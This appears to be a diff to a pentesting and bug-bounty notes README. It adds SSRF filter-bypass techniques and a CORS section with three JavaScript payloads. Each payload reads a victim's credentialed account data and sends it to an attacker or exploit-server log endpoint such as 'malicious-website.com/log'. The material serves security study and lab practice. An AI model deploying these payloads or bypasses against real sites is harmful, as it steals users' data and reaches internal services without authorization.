@@ -1,6 +1,6 @@
 # EasyG
 
-EasyG started out as a script that I use to automate some information gathering tasks for PenTesting and Bug Hunting. Now it is more than that.
+EasyG started out as a script that I use to automate some information gathering tasks for PenTesting and Bug Hunting, [you can find it here](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb). Now it is more than that.
 
 Here I gather all the resources about PenTesting and Bug Bounty Hunting that I find interesting: notes, payloads that I found useful and many links to blogs and articles.
 
@@ -17,6 +17,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
 - [Directory Traversal](#directory-traversal)
 - [Business logic vulnerabilities](#business-logic-vulnerabilities)
+- [CORS](#cors)
 - [DLL Hijacking](#dll-hijacking)
 - [GraphQL](#graphql)
 - [WordPress](#wordpress)
@@ -59,6 +60,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)
 - [Down or not](https://www.websiteplanet.com/webtools/down-or-not/)
 - [DotGit](https://chrome.google.com/webstore/detail/dotgit/pampamgoihgcedonnphgehgondkhikel?hl=en) find if a website has `.git` exposed
+- [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)
 
 Used in [easyg.rb](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb)
 - [nmap](https://nmap.org/)
@@ -188,7 +190,19 @@ Bypass:
 
 ### SSRF
 
-- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+SSRF with blacklist-based input filters bypass: Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
+- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
+- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose;
+- Obfuscating blocked strings using URL encoding or case variation.
+
+SRF with whitelist-based input filters bypass
+- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
+- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
+- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
+- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
+- You can use combinations of these techniques together.
+
+By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
 
 ### Network
 ```
@@ -245,6 +259,44 @@ Examples:
 - Insufficient workflow validation
 - Flawed enforcement of business rules
 - [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
+
+### CORS
+
+Classic CORS vulnerability
+```HTML
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','$url/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+  location='/log?key='+this.responseText;
+  };
+</script>
+```
+
+CORS vulnerability with null origin
+```HTML
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+  req.withCredentials = true;
+  req.send();
+     
+  function reqListener() {
+  location='malicious-website.com/log?key='+this.responseText;
+  };</script>">
+</iframe>
+```
+
+CORS vulnerability with trusted insecure protocols
+```HTML
+<script>
+  document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
 
 ### DLL Hijacking
 
